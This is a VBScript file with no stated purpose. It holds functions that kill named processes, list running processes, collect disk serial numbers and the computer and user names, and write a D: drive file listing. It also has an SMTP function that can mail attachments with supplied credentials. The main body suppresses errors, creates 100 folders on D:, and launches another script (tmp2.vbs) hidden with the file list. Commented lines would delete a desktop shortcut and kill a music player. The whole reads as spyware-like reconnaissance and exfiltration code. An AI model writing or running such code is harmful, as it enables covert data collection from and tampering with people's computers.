Function KillProc(strProcName)
On Error Resume Next
	Set wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
	Set process=wmi.ExecQuery("select * from win32_process where Name ='"&strProcName&"'")
	For Each p In process
		p.Terminate 0
	Next
End Function


Function FilesTree(sPath)        
    Set oFso = CreateObject("Scripting.FileSystemObject")
    If oFso.FileExists("files.txt") Then
	  Set f = oFso.GetFile("files.txt")
	  f.Delete
	End if
    Set fl = oFso.CreateTextFile("files.txt",True)
    Set oFolder = oFso.GetFolder(sPath)   
    Set oSubFolders = oFolder.SubFolders    
    Set oFiles = oFolder.Files
    For Each dir In oSubFolders
    	fl.WriteLine(dir)
    next    
    For Each oFile In oFiles        
        'Set f=oFso.GetFile(oFile.Path)
        'f.Attributes=2+4
        
        fl.WriteLine(oFile.Path&" size:"&oFile.Size&"byte")
    Next    
    fl.Close
End Function  
Function ListProc()
On Error Resume Next
	Set wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
	Set process=wmi.ExecQuery("select * from win32_process")
	Dim	result
	For Each p In process
		result= result&p.ProcessID&"  "&p.Name&" "&p.ExecutablePath&vbCrLf
	Next
	ListProc = result
End Function
Sub	getfiles(path)
	Set oFso = CreateObject("Scripting.FileSystemObject")
	Set shell = CreateObject("wscript.shell")
	Set tmp = oFso.GetSpecialFolder(2)
	FilesTree(path)
	shell.Run "cmd.exe /c tmp2.vbs "&tmp&"\files.txt",vbhide
End Sub
Function 	getDiskInfo()
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set colDrives = objFSO.Drives
	Dim	result  
	For Each objDrive in colDrives  
		If objDrive.IsReady = True Then 
			result=result+"Label          :" & objDrive.DriveLetter&vbcrlf  
			result=result+ "Disk S/N       :" & objDrive.SerialNumber&vbcrlf   
			result=result+ "Disk Type      :" & objDrive.DriveType  &vbcrlf   
			result=result+ "FS Type        :" & objDrive.filesystem  &vbcrlf   
			result=result+ "Disk Name      :" & objDrive.VolumeName &vbcrlf    
			result=result+ "Total size     :" & objDrive.TotalSize/(1024*1024*1024)&vbcrlf   
			result=result+ "Free space     :" & objDrive.FreeSpace/(1024*1024*1024)&vbcrlf   
			result=result+ "Available space:" & objDrive.AvailableSpace&vbcrlf   
			result=result+vbcrlf
		End If 
	Next
	getDiskInfo=result
End	Function
Function	getComputerName()
	Set wshshell = CreateObject("wscript.network")

	hostname=wshshell.username
	computername = wshshell.ComputerName
	getComputerName = computername&"+"&hostname

End	Function
function Send_mail(You_Account,You_Password,Send_Email,Send_Email2,Send_Topic,Send_Body,Send_Attachment)
			On	Error Resume Next
			You_ID = Split(You_Account, "@", -1, vbTextCompare)
			MS_Space = "http://schemas.microsoft.com/cdo/configuration/"
			Set Email = CreateObject("CDO.Message")
			Email.From = You_Account
			Email.To = Send_Email
			If Send_Email2 <> "" Then
			Email.CC = Send_Email2
			End If
			Email.Subject = Send_Topic
			Email.Textbody = Send_Body
			If Send_Attachment <> "" Then
			Email.AddAttachment Send_Attachment
			End If
			With Email.Configuration.Fields
			.Item(MS_Space&"sendusing") = 2
			.Item(MS_Space&"smtpserver") = "smtp."&You_ID(1)
			.Item(MS_Space&"smtpserverport") = 25
			.Item(MS_Space&"smtpauthenticate") = 1
			.Item(MS_Space&"sendusername") = You_ID(0)
			.Item(MS_Space&"sendpassword") = You_Password
			.Update
			End With
			Email.Send
			Set Email = Nothing
			Send_Mail = True
			If Err Then
			Err.Clear
			Send_Mail = False
			End If
End Function
On Error Resume next

Set oFso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("wscript.shell")
Set tmp = oFso.GetSpecialFolder(2)
Dim	desk
desk = shell.SpecialFolders("desktop")
'Set sh = CreateObject("Shell.Application")
'sh.ShellExecute "C:\Users\xiongda\Desktop\Microsoft Word 2010.lnk"
'KillProc("KuGou.exe")
'desk = shell.SpecialFolders("desktop")
'Set f=oFso.GetFile("C:\Users\xiongda\Desktop\∞Æ∆Ê“’.lnk")
'f.delete
On Error Resume next
For a=1 To 100
	oFso.CreateFolder("D:\"&CStr(a))
Next 

FilesTree("D:\")
'"C:\Program Files (x86)\KuGou\KGMusic\")
'Dim	con
'con = ListProc()
'Set f = oFso.CreateTextFile("files.txt",True)
'f.Write(con)
'f.Close,
'Dim f
'QyClient.exe C:\Program Files (x86)\IQIYI Video\LStyle\6.5.68.5801\QyClient.exe
shell.Run "cmd.exe /c tmp2.vbs "&tmp&"\files.txt",vbhide 
